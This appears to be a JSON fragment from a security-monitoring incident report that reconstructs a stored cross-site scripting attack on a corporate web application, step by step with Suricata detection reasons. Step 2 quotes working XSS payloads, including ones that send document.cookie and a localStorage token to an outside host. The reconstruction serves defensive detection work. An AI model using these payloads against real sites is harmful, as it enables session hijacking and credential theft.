  "attack_progression": [
    {"step": 1, "tactic": "Reconnaissance — Injection Surface Mapping", "technique": "T1595.003", "what_happened": "At 2026-05-13 09:02:11 CEST, data.srcip=198.51.100.42 issued a burst of HTTP GET requests against data.dstip=10.108.57.177 enumerating user-input endpoints on the corporate web application — /comments, /api/comments, /feedback, /api/feedback, /search, /profile/update, /api/users/profile, /contact, /forum/post, /api/posts. The requests rotated browser User-Agent strings and carried an X-Forwarded-For: 198.51.100.42 header. Suricata logged the sequence as web-application reconnaissance. This is the classic pre-injection step: identify which endpoints accept and later render attacker-controlled content before spending payloads.", "chain_reason": "Suricata rule.groups containing 'suricata' + 'ids' + 'web' fired with data.srcip=198.51.100.42 against a single data.dstip=10.108.57.177, walking 10 distinct data.url values that all correspond to user-input endpoints within an 5-minute window — sequential endpoint enumeration from one external source.", "first_seen": "2026-05-13T09:02:11+0200"},
    {"step": 2, "tactic": "Initial Access — Stored XSS Payload Injection", "technique": "T1659", "what_happened": "Starting 09:09:30 CEST the same data.srcip=198.51.100.42 switched to HTTP POST requests carrying cross-site scripting payloads into the storage endpoints discovered in step 1 — data.http.method=POST to /api/comments (field comment), /feedback (field message), /profile/update (field bio), /api/posts (field body), /api/feedback (field message). Payloads escalated across three waves: basic markers (<img src=x onerror=alert(1)>, <svg/onload=alert(document.domain)>), filter-bypass obfuscation (mixed-case <ScRiPt>, String.fromCharCode encoding, SVG animate onbegin), then credential-exfil chains (<img src=x onerror='fetch(\"http://198.18.0.70/c?d=\"+btoa(document.cookie))'>, <script>fetch('http://198.18.0.70/exfil?ls='+btoa(localStorage.getItem('token')))</script>). Suricata fired ET WEB_SERVER / ET WEB_SPECIFIC_APPS XSS signatures on the POST bodies.", "chain_reason": "Suricata data.alert.signature matching 'ET WEB_SERVER Possible Cross Site Scripting Attempt' and 'ET WEB_SPECIFIC_APPS' XSS signatures, data.http.method=POST, data.srcip=198.51.100.42 → data.dstip=10.108.57.177, hitting multiple data.url values that overlap exactly with the endpoints enumerated in step 1. rule.mitre.id=T1659 (Content Injection) attached by the rule.", "first_seen": "2026-05-13T09:09:30+0200"},
    {"step": 3, "tactic": "Initial Access — Stored XSS Confirmed on Retrieval", "technique": "T1659", "what_happened": "At 09:18:20 CEST data.srcip=198.51.100.42 issued HTTP GET requests back to the rendering pages — /comments, /api/comments, /feedback, /profile/view, /forum, / — to confirm the injected payload had been stored and was being served back inside the page body. This GET-after-POST loop against the same data.dstip=10.108.57.177 is the verification step that distinguishes a STORED XSS (persisted server-side, served to every subsequent visitor) from a harmless reflected probe. Suricata again fired XSS signatures, this time on the GET response bodies, confirming the payload is now persistent in the application.", "chain_reason": "Suricata XSS data.alert.signature firing on data.http.method=GET responses for data.url in {/comments, /api/comments, /feedback, /profile/view, /forum} from data.dstip=10.108.57.177 — the same payload markers seen in the step 2 POST bodies now present in GET response traffic, confirming server-side persistence.", "first_seen": "2026-05-13T09:18:20+0200"},
    {"step": 4, "tactic": "Command and Control — Injected Script Beacon", "technique": "T1071.001", "what_happened": "From 09:21:40 CEST outbound HTTP requests were observed toward data.dstip=198.18.0.70 on port 80 carrying base64-looking query strings on paths /c?d=, /exfil?ls=, /stage2.js, /beacon?uid= — the callback behaviour the injected XSS payload is designed to perform when the poisoned page renders in a victim browser (cookie + localStorage token exfiltration to the attacker payload host). The requests carried Referer and Origin headers pointing back at http://10.108.57.177/, consistent with script execution inside the context of the corporate application. Suricata logged the outbound attempts; 198.18.0.70 is a non-routable address so the beacons did not complete, but the attempt itself is the C2 stage of the content-injection chain.", "chain_reason": "Suricata flow records with data.dstip=198.18.0.70, data.dstport=80, data.http.method=GET, data.url beginning /c?d= and /exfil?ls= and /beacon?uid=, data.http.user_agent rotating, Referer/Origin headers = http://10.108.57.177/ — outbound beacon pattern correlated to the XSS payload bodies captured in step 2. rule.mitre.id=T1071.001 attached by the rule.", "first_seen": "2026-05-13T09:21:40+0200"}
  ],
